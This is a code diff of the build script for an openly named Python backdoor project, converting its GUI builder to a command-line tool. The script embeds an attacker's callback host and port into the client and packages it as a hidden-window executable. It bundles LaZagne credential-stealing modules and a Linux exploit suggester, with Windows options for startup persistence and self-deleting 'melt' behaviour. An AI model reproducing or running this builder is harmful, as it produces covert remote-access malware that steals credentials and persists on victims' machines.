@@ -6,24 +6,16 @@ https://github.com/xp4xbox/Python-Backdoor
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import shutil
-import ssl
-import threading
-from tkinter import *
-from tkinter.ttk import *
-import tkinter.messagebox
-from tkinter import scrolledtext
-from tkinter import filedialog
-
 import os
 import subprocess
-import socket
 import sys
-import urllib.request
 import site
-import certifi
+import argparse
 
 # append path, needed for all 'main' files
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir)))
+
+os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
 
 from src.definitions import platforms
 import src.helper as helper
@@ -36,37 +28,13 @@ elif platforms.OS == platforms.LINUX:
 elif platforms.OS == platforms.WINDOWS:
     helper.init_submodule("LaZagne/Windows")
 else:
-    tkinter.messagebox.showerror("Error", f"Platform not supported.")
+    print("Platform not supported")
     sys.exit(0)
 
 from lazagne.config.manage_modules import get_modules_names as lazagne_get_modules_names
 from lazagne.softwares.browsers.chromium_browsers import \
     chromium_based_module_location as lazagne_chromium_based_module_location
 from lazagne.softwares.browsers.firefox_browsers import mozilla_module_location as lazagne_mozilla_module_location
-
-
-def null_callback():
-    pass
-
-
-def get_local_ip():
-    try:
-        # create a dummy socket to get local IP address
-        _socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        _socket.connect(("8.8.8.8", 80))
-        ip = _socket.getsockname()[0]
-        _socket.close()
-    except socket.error as e:
-        tkinter.messagebox.showerror("Error", f"You are not connected to the internet: {e}")
-        sys.exit(0)
-
-    return ip
-
-
-def get_external_ip():
-    _request = urllib.request.urlopen("https://checkip.amazonaws.com",
-                                      context=ssl.create_default_context(cafile=certifi.where()))
-    return _request.read().decode("utf-8")
 
 
 def get_pyinstaller():
@@ -81,7 +49,7 @@ def get_pyinstaller():
             if os.path.isfile(user_bin):
                 return "\"" + user_bin + "\""
 
-            tkinter.messagebox.showerror("Error", "Pyinstaller not found, add manually to path: https://stackoverflow.com/a/39646511")
+        print("Pyinstaller not found, add manually to path: https://stackoverflow.com/a/39646511")
     else:
         user_path = site.getusersitepackages().split("\\")[:-1]
         user_path = "\\".join(user_path)
@@ -91,216 +59,91 @@ def get_pyinstaller():
             if os.path.isfile(_path):
                 return "\"" + _path + "\""
 
-        tkinter.messagebox.showerror("Error", "Pyinstaller not found in any site packages.")
+        print("Pyinstaller not found in any site packages.")
 
     sys.exit(0)
 
 
-def save_files(client_args):
-    main_match = "if __name__ == \"__main__\":"
-    client_new_line = f"{main_match}\n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"
+def parse_args():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-hI", "--host-ip", help="Host IP", type=str, default="127.0.0.1", dest="host_ip")
+    parser.add_argument("-hH", "--host-hostname", help="Host Hostname (overrides host IP)", dest="host_hostname")
+    parser.add_argument("-p", "--port", help="Port", type=int, default="3003", dest="port")
+    parser.add_argument("-i", "--icon", help="Path to icon file", type=str, dest="icon")
+    parser.add_argument("-c", "--console", help="Console app", action="store_true", dest="console")
+    parser.add_argument("-d", "--debug", help="PyInstaller debug", action="store_true", dest="debug")
 
-    file = open("main_client.py", "r")
-    file_contents = file.readlines()
-    file.close()
+    if platforms.OS == platforms.WINDOWS:
+        parser.add_argument("-s", "--startup", help="Add to startup on launch", action="store_true", dest="startup")
+        parser.add_argument("-m", "--melt", help="Melt file on startup", action="store_true", dest="melt")
 
-    i = 0
-    for i in range(0, len(file_contents)):
-        if file_contents[i][:len(main_match)] == main_match:
-            break
-
-    file_contents = file_contents[:i]
-    file_contents.append(client_new_line)
-
-    file = open("main_client.py", "w")
-    file.writelines(file_contents)
-    file.close()
+    return parser.parse_args()
 
 
-class Setup:
+class Main:
     def __init__(self):
-        os.chdir(os.path.dirname(os.path.abspath(__file__)))  # ensure proper dir
+        self.args = None
+        self.host = ""
 
-        self.pyinstaller = get_pyinstaller()
+        self.parse_args()
 
-        self.local_ip = get_local_ip()
-        self.external_ip = get_external_ip()
-        self.loopback_ip = "127.0.0.1"
-        self.host = self.local_ip
+        self.update_client()
 
-        self.root = Tk()
-        self.melt = IntVar()
-        self.add_startup = IntVar()
-        self.is_console = IntVar()
-        self.is_debug = IntVar()
-        self.icon = IntVar()
-        self.icon_path = None
-        self.is_hostname = False
-        self.log = ""
+        self.build()
 
-        self.create_ui()
+    def update_client(self):
+        client_args = \
+            [f"'{self.host.lstrip().rstrip()}'",
+             str(self.args.port), str(self.args.host_hostname is not None),
+             str(hasattr(self.args, "startup") and self.args.startup),
+             str(hasattr(self.args, "melt") and str(self.args.melt))]
 
-    def create_ui(self):
-        # dummy value
-        self.root_log = Label()
+        main_match = "if __name__ == \"__main__\":"
+        client_new_line = f"{main_match}\n{4 * ' '}MainClient({', '.join(client_args)}).start()\n"
 
-        self.root.resizable(0, 0)
-        self.root.title("Python backdoor setup")
+        file = open("main_client.py", "r")
+        file_contents = file.readlines()
+        file.close()
 
-        self.frame = Frame(self.root)
-        self.frame.grid(row=0, column=0, padx=10, pady=10)
+        i = 0
+        for i in range(0, len(file_contents)):
+            if file_contents[i][:len(main_match)] == main_match:
+                break
 
-        self.host_frame = LabelFrame(self.frame, text="Host")
-        self.host_frame.pack(side=TOP, anchor=NW)
+        file_contents = file_contents[:i]
+        file_contents.append(client_new_line)
 
-        self.lt = Label(self.host_frame, text="Choose host:")
-        self.lt.grid(row=0, column=0, padx=8, pady=5)
+        file = open("main_client.py", "w")
+        file.writelines(file_contents)
+        file.close()
 
-        self.host_cb = Combobox(self.host_frame,
-                                values=["Local IP", "External IP", "Other IP", "DNS hostname", "Loopback"], width=20)
-        self.host_cb.grid(column=1, row=0, pady=5, padx=8)
-        self.host_cb.bind("<<ComboboxSelected>>", self.host_cb_callback)
-        self.host_cb.current(0)
+    def parse_args(self):
+        self.args = parse_args()
 
-        self.host_widg = Label(self.host_frame, text=self.local_ip)
-        self.host_widg.grid(column=2, row=0, padx=8, pady=5)
-
-        self.port_lb = Label(self.host_frame, text="Choose port:")
-        self.port_lb.grid(column=0, row=1, pady=8)
-
-        self.port_et = Entry(self.host_frame, width=7)
-        self.port_et.insert(END, "3003")
-        self.port_et.grid(column=1, row=1, pady=8)
-
-        self.misc_frame = LabelFrame(self.frame, text="Misc.")
-        self.misc_frame.pack(side=LEFT)
-
-        self.startup_cb = Checkbutton(self.misc_frame, text="Add to startup on launch", variable=self.add_startup)
-        self.startup_cb.grid(column=0, row=0, sticky=W)
-
-        self.add_icon_cb = Checkbutton(self.misc_frame, text="Custom icon", variable=self.icon,
-                                       command=self.add_icon_cb_callback)
-        self.add_icon_cb.grid(column=0, row=1, sticky=W)
-
-        self.melt_cb = Checkbutton(self.misc_frame, text="Melt file", variable=self.melt)
-        self.melt_cb.grid(column=0, row=2, sticky=W)
-
-        self.console_cb = Checkbutton(self.misc_frame, text="Console app", variable=self.is_console)
-        self.console_cb.grid(column=0, row=4, sticky=W)
-
-        self.debug_cb = Checkbutton(self.misc_frame, text="Pyinstaller debug", variable=self.is_debug,
-                                    command=self.debug_cb_callback)
-        self.debug_cb.grid(column=0, row=5, sticky=W)
-
-        self.build_btn = Button(self.frame, text="Build", width=36, command=self.build_btn_callback)
-        self.build_btn.pack(padx=8, side=BOTTOM, anchor=W)
-
-        self.update_for_os()
-        self.root.mainloop()
-
-    def update_for_os(self):
-        if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
-            self.add_startup.set(0)
-            self.startup_cb.config(state=DISABLED)
-            self.melt.set(0)
-            self.melt_cb.config(state=DISABLED)
-
-    def default_build_ui_state(self):
-        self.root.protocol("WM_DELETE_WINDOW", self.root.destroy)
-        self.build_btn["state"] = "enabled"
-        self.build_btn.config(text="Build")
-
-    def disable_build_ui(self):
-        self.build_btn["state"] = "disabled"
-        self.build_btn.config(text="Please wait...")
-        self.root_log.destroy()
-        self.root.protocol("WM_DELETE_WINDOW", null_callback)
-
-    def create_log_ui(self, log):
-        self.root_log = Toplevel(self.root)
-        self.root_log.title("Pyinstaller log")
-        self.root_log.geometry("500x300")
-
-        self.root_log_frame = LabelFrame(self.root_log, text="Log")
-        self.root_log_frame.pack(padx=8, pady=8, fill=BOTH, expand=YES)
-
-        self.log_sbtxt = scrolledtext.ScrolledText(self.root_log_frame)
-        self.log_sbtxt.pack(padx=4, pady=4, fill=BOTH, expand=YES)
-
-        self.log_sbtxt.insert(INSERT, log)
-        self.log_sbtxt.configure(state="disabled")
-
-    def debug_cb_callback(self):
-        if bool(self.is_debug.get()):
-            self.is_console.set(1)
-            self.console_cb.config(state=DISABLED)
+        if self.args.host_hostname:
+            self.host = self.args.host_hostname
         else:
-            self.console_cb.config(state=ACTIVE)
+            self.host = self.args.host_ip
 
-    def build_btn_callback(self):
-        port = self.port_et.get()
+        if self.args.port:
+            if self.args.port > 65535 or self.args.port < 1024:
+                print("Invalid port number, between 1024 and 65535")
+                sys.exit(0)
 
-        if not isinstance(self.host_widg, Entry):
-            self.host = self.host_widg["text"]
-        else:
-            self.host = self.host_widg.get()
+        if self.args.icon:
+            if not os.path.isfile(self.args.icon) or not self.args.icon.endswith(".ico"):
+                print(f"Could not resolve .ico: {self.args.icon}")
+                sys.exit(0)
 
-        if not port.isdigit():
-            tkinter.messagebox.showerror("Build", "You must enter numeric value for the port")
-        elif not 1024 <= int(port) <= 65535:
-            tkinter.messagebox.showerror("Build", "Please enter a port number between 1024 and 65535")
-        else:
-            self.disable_build_ui()
+            self.args.icon = "\"" + os.path.normpath(self.args.icon.replace("\"", "")) + "\""
 
-            client_args = \
-                [f"'{self.host.lstrip().rstrip()}'", str(port), str(self.is_hostname), str(bool(self.add_startup.get())),
-                 str(bool(self.melt.get()))]
-
-            save_files(client_args)
-
-            self.build()
-
-    def add_icon_cb_callback(self):
-        if self.icon.get() == 1:
-            path = filedialog.askopenfile(parent=self.root, title="Choose icon", filetypes=[("icon", ".ico")])
-
-            if path is not None:
-                self.icon_path = "\"" + path.name + "\""
-                path.close()
-            else:
-                self.icon.set(0)
-        else:
-            self.icon_path = None
-
-    def host_cb_callback(self, evt):
-        value = evt.widget.get()
-
-        if self.host_widg.winfo_exists() is not None:
-            self.host_widg.destroy()
-
-        if value in ["Local IP", "External IP", "Loopback"]:
-            self.host_widg = Label(self.host_frame)
-            self.host_widg.grid(column=2, row=0, padx=8, pady=5)
-        else:
-            self.host_widg = Entry(self.host_frame, width=12)
-            if value == "DNS hostname":
-                self.host_widg.insert(END, "hostname")
-                self.is_hostname = True
-            else:
-                self.host_widg.insert(END, "IP")
-            self.host_widg.grid(column=2, row=0, padx=8, pady=5)
-
-        if value == "External IP":
-            self.host_widg["text"] = self.external_ip
-        elif value == "Local IP":
-            self.host_widg["text"] = self.local_ip
-        elif value == "Loopback":
-            self.host_widg["text"] = self.loopback_ip
+        if self.args.debug:
+            self.args.console = True
 
     def build(self):
-        windowed = "" if bool(self.is_console.get()) else "--windowed"
-        icon_command = f"--icon {self.icon_path}" if self.icon_path else ""
-        debug_command = "--debug=all --log-level DEBUG" if bool(self.is_debug.get()) else ""
+        windowed = "" if bool(self.args.console) else "--windowed"
+        icon_command = f"--icon {self.args.icon}" if self.args.icon else ""
+        debug_command = "--debug=all --log-level DEBUG" if bool(self.args.debug) else ""
 
         # add to path for all python submodules
         if platforms.OS == platforms.WINDOWS:
@@ -339,20 +182,14 @@ class Setup:
             les_path = f"{helper.get_submodule_path('linux-exploit-suggester')}/linux-exploit-suggester.sh"
             binary += f"--add-data=\"{les_path}:src/submodule/linux-exploit-suggester\""
 
-        command_arg = f"{self.pyinstaller} main_client.py {windowed} {icon_command} {debug_command} {paths} {binary} {hidden_imports}" \
+        command_arg = f"{get_pyinstaller()} main_client.py {windowed} {icon_command} {debug_command} {paths} {binary} {hidden_imports}" \
                       f"--onefile -y --clean --exclude-module FixTk --exclude-module tcl " \
                       f"--exclude-module tk --exclude-module _tkinter --exclude-module tkinter --exclude-module " \
                       f"Tkinter"
 
-        def run_pyinstaller():
-            self.command = subprocess.Popen(command_arg, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE,
-                                            stdin=subprocess.PIPE)
-            log, log = self.command.communicate()
-            self.default_build_ui_state()
-            self.create_log_ui(log)
-
-        threading.Thread(target=run_pyinstaller, daemon=False).start()
+        command = subprocess.Popen(command_arg, shell=True, stderr=sys.stdout, stdout=sys.stderr, stdin=sys.stdin)
+        _, _ = command.communicate()
 
 
 if __name__ == "__main__":
-    Setup()
+    Main()
